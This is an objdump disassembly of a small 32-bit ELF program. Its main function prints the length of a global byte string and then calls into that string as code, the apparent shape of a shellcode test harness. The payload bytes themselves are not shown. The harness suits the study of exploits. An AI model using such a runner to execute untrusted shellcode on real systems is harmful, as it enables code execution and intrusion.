
main:     file format elf32-i386


Disassembly of section .init:

0804830c <_init>:
 804830c:	55                   	push   %ebp
 804830d:	89 e5                	mov    %esp,%ebp
 804830f:	53                   	push   %ebx
 8048310:	83 ec 04             	sub    $0x4,%esp
 8048313:	e8 00 00 00 00       	call   8048318 <_init+0xc>
 8048318:	5b                   	pop    %ebx
 8048319:	81 c3 ec 13 00 00    	add    $0x13ec,%ebx
 804831f:	8b 93 fc ff ff ff    	mov    -0x4(%ebx),%edx
 8048325:	85 d2                	test   %edx,%edx
 8048327:	74 05                	je     804832e <_init+0x22>
 8048329:	e8 22 00 00 00       	call   8048350 <__gmon_start__@plt>
 804832e:	58                   	pop    %eax
 804832f:	5b                   	pop    %ebx
 8048330:	c9                   	leave  
 8048331:	c3                   	ret    

Disassembly of section .plt:

08048340 <__gmon_start__@plt-0x10>:
 8048340:	ff 35 08 97 04 08    	pushl  0x8049708
 8048346:	ff 25 0c 97 04 08    	jmp    *0x804970c
 804834c:	00 00                	add    %al,(%eax)
	...

08048350 <__gmon_start__@plt>:
 8048350:	ff 25 10 97 04 08    	jmp    *0x8049710
 8048356:	68 00 00 00 00       	push   $0x0
 804835b:	e9 e0 ff ff ff       	jmp    8048340 <_init+0x34>

08048360 <strlen@plt>:
 8048360:	ff 25 14 97 04 08    	jmp    *0x8049714
 8048366:	68 08 00 00 00       	push   $0x8
 804836b:	e9 d0 ff ff ff       	jmp    8048340 <_init+0x34>

08048370 <__libc_start_main@plt>:
 8048370:	ff 25 18 97 04 08    	jmp    *0x8049718
 8048376:	68 10 00 00 00       	push   $0x10
 804837b:	e9 c0 ff ff ff       	jmp    8048340 <_init+0x34>

08048380 <fprintf@plt>:
 8048380:	ff 25 1c 97 04 08    	jmp    *0x804971c
 8048386:	68 18 00 00 00       	push   $0x18
 804838b:	e9 b0 ff ff ff       	jmp    8048340 <_init+0x34>

Disassembly of section .text:

08048390 <_start>:
 8048390:	31 ed                	xor    %ebp,%ebp
 8048392:	5e                   	pop    %esi
 8048393:	89 e1                	mov    %esp,%ecx
 8048395:	83 e4 f0             	and    $0xfffffff0,%esp
 8048398:	50                   	push   %eax
 8048399:	54                   	push   %esp
 804839a:	52                   	push   %edx
 804839b:	68 c0 84 04 08       	push   $0x80484c0
 80483a0:	68 d0 84 04 08       	push   $0x80484d0
 80483a5:	51                   	push   %ecx
 80483a6:	56                   	push   %esi
 80483a7:	68 7c 84 04 08       	push   $0x804847c
 80483ac:	e8 bf ff ff ff       	call   8048370 <__libc_start_main@plt>
 80483b1:	f4                   	hlt    
 80483b2:	90                   	nop
 80483b3:	90                   	nop
 80483b4:	90                   	nop
 80483b5:	90                   	nop
 80483b6:	90                   	nop
 80483b7:	90                   	nop
 80483b8:	90                   	nop
 80483b9:	90                   	nop
 80483ba:	90                   	nop
 80483bb:	90                   	nop
 80483bc:	90                   	nop
 80483bd:	90                   	nop
 80483be:	90                   	nop
 80483bf:	90                   	nop

080483c0 <deregister_tm_clones>:
 80483c0:	b8 2f 97 04 08       	mov    $0x804972f,%eax
 80483c5:	2d 2c 97 04 08       	sub    $0x804972c,%eax
 80483ca:	83 f8 06             	cmp    $0x6,%eax
 80483cd:	77 02                	ja     80483d1 <deregister_tm_clones+0x11>
 80483cf:	f3 c3                	repz ret 
 80483d1:	b8 00 00 00 00       	mov    $0x0,%eax
 80483d6:	85 c0                	test   %eax,%eax
 80483d8:	74 f5                	je     80483cf <deregister_tm_clones+0xf>
 80483da:	55                   	push   %ebp
 80483db:	89 e5                	mov    %esp,%ebp
 80483dd:	83 ec 18             	sub    $0x18,%esp
 80483e0:	c7 04 24 2c 97 04 08 	movl   $0x804972c,(%esp)
 80483e7:	ff d0                	call   *%eax
 80483e9:	c9                   	leave  
 80483ea:	c3                   	ret    
 80483eb:	90                   	nop
 80483ec:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi

080483f0 <register_tm_clones>:
 80483f0:	b8 2c 97 04 08       	mov    $0x804972c,%eax
 80483f5:	2d 2c 97 04 08       	sub    $0x804972c,%eax
 80483fa:	c1 f8 02             	sar    $0x2,%eax
 80483fd:	89 c2                	mov    %eax,%edx
 80483ff:	c1 ea 1f             	shr    $0x1f,%edx
 8048402:	01 d0                	add    %edx,%eax
 8048404:	d1 f8                	sar    %eax
 8048406:	75 02                	jne    804840a <register_tm_clones+0x1a>
 8048408:	f3 c3                	repz ret 
 804840a:	ba 00 00 00 00       	mov    $0x0,%edx
 804840f:	85 d2                	test   %edx,%edx
 8048411:	74 f5                	je     8048408 <register_tm_clones+0x18>
 8048413:	55                   	push   %ebp
 8048414:	89 e5                	mov    %esp,%ebp
 8048416:	83 ec 18             	sub    $0x18,%esp
 8048419:	89 44 24 04          	mov    %eax,0x4(%esp)
 804841d:	c7 04 24 2c 97 04 08 	movl   $0x804972c,(%esp)
 8048424:	ff d2                	call   *%edx
 8048426:	c9                   	leave  
 8048427:	c3                   	ret    
 8048428:	90                   	nop
 8048429:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi

08048430 <__do_global_dtors_aux>:
 8048430:	80 3d 44 97 04 08 00 	cmpb   $0x0,0x8049744
 8048437:	75 13                	jne    804844c <__do_global_dtors_aux+0x1c>
 8048439:	55                   	push   %ebp
 804843a:	89 e5                	mov    %esp,%ebp
 804843c:	83 ec 08             	sub    $0x8,%esp
 804843f:	e8 7c ff ff ff       	call   80483c0 <deregister_tm_clones>
 8048444:	c6 05 44 97 04 08 01 	movb   $0x1,0x8049744
 804844b:	c9                   	leave  
 804844c:	f3 c3                	repz ret 
 804844e:	66 90                	xchg   %ax,%ax

08048450 <frame_dummy>:
 8048450:	a1 0c 96 04 08       	mov    0x804960c,%eax
 8048455:	85 c0                	test   %eax,%eax
 8048457:	74 1e                	je     8048477 <frame_dummy+0x27>
 8048459:	b8 00 00 00 00       	mov    $0x0,%eax
 804845e:	85 c0                	test   %eax,%eax
 8048460:	74 15                	je     8048477 <frame_dummy+0x27>
 8048462:	55                   	push   %ebp
 8048463:	89 e5                	mov    %esp,%ebp
 8048465:	83 ec 18             	sub    $0x18,%esp
 8048468:	c7 04 24 0c 96 04 08 	movl   $0x804960c,(%esp)
 804846f:	ff d0                	call   *%eax
 8048471:	c9                   	leave  
 8048472:	e9 79 ff ff ff       	jmp    80483f0 <register_tm_clones>
 8048477:	e9 74 ff ff ff       	jmp    80483f0 <register_tm_clones>

0804847c <main>:
 804847c:	55                   	push   %ebp
 804847d:	89 e5                	mov    %esp,%ebp
 804847f:	83 e4 f0             	and    $0xfffffff0,%esp
 8048482:	83 ec 10             	sub    $0x10,%esp
 8048485:	a1 28 97 04 08       	mov    0x8049728,%eax
 804848a:	89 04 24             	mov    %eax,(%esp)
 804848d:	e8 ce fe ff ff       	call   8048360 <strlen@plt>
 8048492:	8b 15 40 97 04 08    	mov    0x8049740,%edx
 8048498:	89 44 24 08          	mov    %eax,0x8(%esp)
 804849c:	c7 44 24 04 7b 85 04 	movl   $0x804857b,0x4(%esp)
 80484a3:	08 
 80484a4:	89 14 24             	mov    %edx,(%esp)
 80484a7:	e8 d4 fe ff ff       	call   8048380 <fprintf@plt>
 80484ac:	a1 28 97 04 08       	mov    0x8049728,%eax
 80484b1:	ff d0                	call   *%eax
 80484b3:	b8 00 00 00 00       	mov    $0x0,%eax
 80484b8:	c9                   	leave  
 80484b9:	c3                   	ret    
 80484ba:	90                   	nop
 80484bb:	90                   	nop
 80484bc:	90                   	nop
 80484bd:	90                   	nop
 80484be:	90                   	nop
 80484bf:	90                   	nop

080484c0 <__libc_csu_fini>:
 80484c0:	55                   	push   %ebp
 80484c1:	89 e5                	mov    %esp,%ebp
 80484c3:	5d                   	pop    %ebp
 80484c4:	c3                   	ret    
 80484c5:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
 80484c9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi

080484d0 <__libc_csu_init>:
 80484d0:	55                   	push   %ebp
 80484d1:	89 e5                	mov    %esp,%ebp
 80484d3:	57                   	push   %edi
 80484d4:	56                   	push   %esi
 80484d5:	53                   	push   %ebx
 80484d6:	e8 4f 00 00 00       	call   804852a <__i686.get_pc_thunk.bx>
 80484db:	81 c3 29 12 00 00    	add    $0x1229,%ebx
 80484e1:	83 ec 1c             	sub    $0x1c,%esp
 80484e4:	e8 23 fe ff ff       	call   804830c <_init>
 80484e9:	8d bb 04 ff ff ff    	lea    -0xfc(%ebx),%edi
 80484ef:	8d 83 00 ff ff ff    	lea    -0x100(%ebx),%eax
 80484f5:	29 c7                	sub    %eax,%edi
 80484f7:	c1 ff 02             	sar    $0x2,%edi
 80484fa:	85 ff                	test   %edi,%edi
 80484fc:	74 24                	je     8048522 <__libc_csu_init+0x52>
 80484fe:	31 f6                	xor    %esi,%esi
 8048500:	8b 45 10             	mov    0x10(%ebp),%eax
 8048503:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048507:	8b 45 0c             	mov    0xc(%ebp),%eax
 804850a:	89 44 24 04          	mov    %eax,0x4(%esp)
 804850e:	8b 45 08             	mov    0x8(%ebp),%eax
 8048511:	89 04 24             	mov    %eax,(%esp)
 8048514:	ff 94 b3 00 ff ff ff 	call   *-0x100(%ebx,%esi,4)
 804851b:	83 c6 01             	add    $0x1,%esi
 804851e:	39 fe                	cmp    %edi,%esi
 8048520:	72 de                	jb     8048500 <__libc_csu_init+0x30>
 8048522:	83 c4 1c             	add    $0x1c,%esp
 8048525:	5b                   	pop    %ebx
 8048526:	5e                   	pop    %esi
 8048527:	5f                   	pop    %edi
 8048528:	5d                   	pop    %ebp
 8048529:	c3                   	ret    

0804852a <__i686.get_pc_thunk.bx>:
 804852a:	8b 1c 24             	mov    (%esp),%ebx
 804852d:	c3                   	ret    
 804852e:	90                   	nop
 804852f:	90                   	nop

Disassembly of section .fini:

08048530 <_fini>:
 8048530:	55                   	push   %ebp
 8048531:	89 e5                	mov    %esp,%ebp
 8048533:	53                   	push   %ebx
 8048534:	83 ec 04             	sub    $0x4,%esp
 8048537:	e8 00 00 00 00       	call   804853c <_fini+0xc>
 804853c:	5b                   	pop    %ebx
 804853d:	81 c3 c8 11 00 00    	add    $0x11c8,%ebx
 8048543:	59                   	pop    %ecx
 8048544:	5b                   	pop    %ebx
 8048545:	c9                   	leave  
 8048546:	c3                   	ret    
